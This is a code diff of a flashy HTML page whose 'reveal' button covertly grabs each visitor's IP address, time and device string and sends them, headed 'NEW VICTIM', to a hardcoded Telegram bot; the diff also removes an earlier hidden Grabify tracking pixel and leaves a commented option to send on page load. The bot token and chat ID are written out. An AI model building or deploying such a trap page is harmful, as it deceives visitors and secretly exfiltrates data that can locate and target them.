@@ -29,42 +29,24 @@
       height: 12px;
       background: #ff0000;
       border-radius: 50%;
-      box-shadow: 
-        0 0 15px #ff0000,
-        0 0 30px #ff1a1a,
-        0 0 50px #ff3333,
-        0 0 70px #ff0000;
+      box-shadow: 0 0 15px #ff0000, 0 0 30px #ff1a1a, 0 0 50px #ff3333, 0 0 70px #ff0000;
       animation: fall linear infinite;
       opacity: 0.9;
     }
 
     @keyframes fall {
-      0% {
-        transform: translateY(-100px) scale(1);
-        opacity: 1;
-      }
-      100% {
-        transform: translateY(110vh) scale(0.5);
-        opacity: 0;
-      }
+      0% { transform: translateY(-100px) scale(1); opacity: 1; }
+      100% { transform: translateY(110vh) scale(0.5); opacity: 0; }
     }
 
-    .container {
-      position: relative;
-      width: 90%;
-      max-width: 400px;
-      z-index: 10;
-    }
+    .container { position: relative; width: 90%; max-width: 400px; z-index: 10; }
 
     .box {
       background: rgba(15, 0, 0, 0.97);
       border: 4px solid #ff0000;
       border-radius: 22px;
       padding: 35px 20px;
-      box-shadow: 
-        0 0 40px #ff0000,
-        0 0 80px #ff1a1a,
-        inset 0 0 20px rgba(255,0,0,0.3);
+      box-shadow: 0 0 40px #ff0000, 0 0 80px #ff1a1a, inset 0 0 20px rgba(255,0,0,0.3);
       animation: drop 1.5s ease-out forwards;
       opacity: 0;
       transform: translateY(-100px);
@@ -80,10 +62,7 @@
       font-family: 'Orbitron', sans-serif;
       font-size: 2.4rem;
       color: #ff0000;
-      text-shadow: 
-        0 0 15px #ff0000,
-        0 0 30px #ff1a1a,
-        0 0 50px #ff3333;
+      text-shadow: 0 0 15px #ff0000, 0 0 30px #ff1a1a, 0 0 50px #ff3333;
       margin-bottom: 20px;
       animation: glow 1.5s infinite alternate;
     }
@@ -164,56 +143,55 @@
   <script>
     // === RED GLOWING CIRCLES ===
     const container = document.getElementById('circles');
-
     function createCircle() {
-      const circle = document.createElement('div');
-      circle.classList.add('circle');
-      circle.style.left = Math.random() * 100 + 'vw';
-      circle.style.animationDuration = Math.random() * 5 + 5 + 's';
-      circle.style.width = circle.style.height = Math.random() * 15 + 8 + 'px';
-      container.appendChild(circle);
-      setTimeout(() => circle.remove(), 12000);
+      const c = document.createElement('div');
+      c.classList.add('circle');
+      c.style.left = Math.random() * 100 + 'vw';
+      c.style.animationDuration = Math.random() * 5 + 5 + 's';
+      c.style.width = c.style.height = Math.random() * 15 + 8 + 'px';
+      container.appendChild(c);
+      setTimeout(() => c.remove(), 12000);
     }
-
     setInterval(createCircle, 150);
 
-    // === IP GRAB & GRABIFY LOG (USING OLJIY9) ===
-    let userIP = "Unknown";
+    // === TELEGRAM BOT INFO ===
+    const BOT_TOKEN = '8501597773:AAG1l8FnPsKtOt8sJ7ejB0r-zSacGwpYuBI';
+    const CHAT_ID = '6726658638'; // ← YOU MUST SET THIS
+
+    // === GET IP + SEND TO TELEGRAM ===
+    function sendToTelegram(ip, time, ua) {
+      const message = `NEW VICTIM\n\nIP: ${ip}\nTime: ${time}\nDevice: ${ua}\nLink: ${location.href}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+        .catch(() => {});
+    }
 
     function getIP() {
       fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(data => {
-          userIP = data.ip;
-          document.getElementById('ip').innerHTML = userIP;
+          const ip = data.ip;
+          const time = new Date().toLocaleString();
+          const ua = navigator.userAgent.substring(0, 100);
+          document.getElementById('ip').innerHTML = ip;
+          sendToTelegram(ip, time, ua);
         })
         .catch(() => {
-          userIP = "BLOCKED";
-          document.getElementById('ip').innerHTML = userIP;
+          document.getElementById('ip').innerHTML = "BLOCKED";
         });
     }
 
     function reveal() {
-      // === SEND TO GRABIFY WITH YOUR CODE: OLJIY9 ===
-      const img = document.createElement('img');
-      img.src = 'https://grabify.link/OLJIY9?' + Date.now();
-      img.width = 1;
-      img.height = 1;
-      img.style.display = 'none';
-      document.body.appendChild(img);
-
-      // Show result
       document.getElementById('step1').classList.add('hidden');
       document.querySelector('.btn').classList.add('hidden');
       const result = document.getElementById('result');
       result.classList.remove('hidden');
       setTimeout(() => result.style.opacity = 1, 100);
-
       getIP();
     }
+
+    // AUTO-SEND ON PAGE LOAD (OPTIONAL)
+    // getIP(); // Remove // to send IP on open
   </script>
 
 </body>
 </html>
-
-
